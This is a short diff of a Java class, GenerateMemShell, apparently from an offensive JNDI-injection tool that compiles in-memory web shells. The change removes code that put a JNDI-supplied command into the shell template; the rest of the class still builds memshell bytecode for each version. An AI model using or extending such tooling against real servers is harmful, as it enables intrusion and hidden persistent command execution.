@@ -2,7 +2,6 @@ package core;
 
 import core.memshellstr.ConstantTemplate;
 import core.utils.Compiler;
-import jndi.JettyServer;
 import utils.Util;
 
 import java.lang.reflect.Field;
@@ -58,10 +57,6 @@ public class GenerateMemShell {
                 Map<String, byte[]> tmp = new HashMap<String, byte[]>();
                 constantName = ConstantTemplate.class.getDeclaredField(memName);
                 memShellString = (String) constantName.get(new ConstantTemplate());
-                String jndiCmd = JettyServer.command;
-                if (jndiCmd !=null && !jndiCmd.equals("")){
-                    memShellString = memShellString.replace("{{cmd}}", jndiCmd); // jndi 动态执行命令
-                }
                 shellcode = Compiler.createMemShell(memName, memShellString, optionsMapper.get(version));
                 codeByte = shellcode.get(memName);
                 tmp.put(version, codeByte);
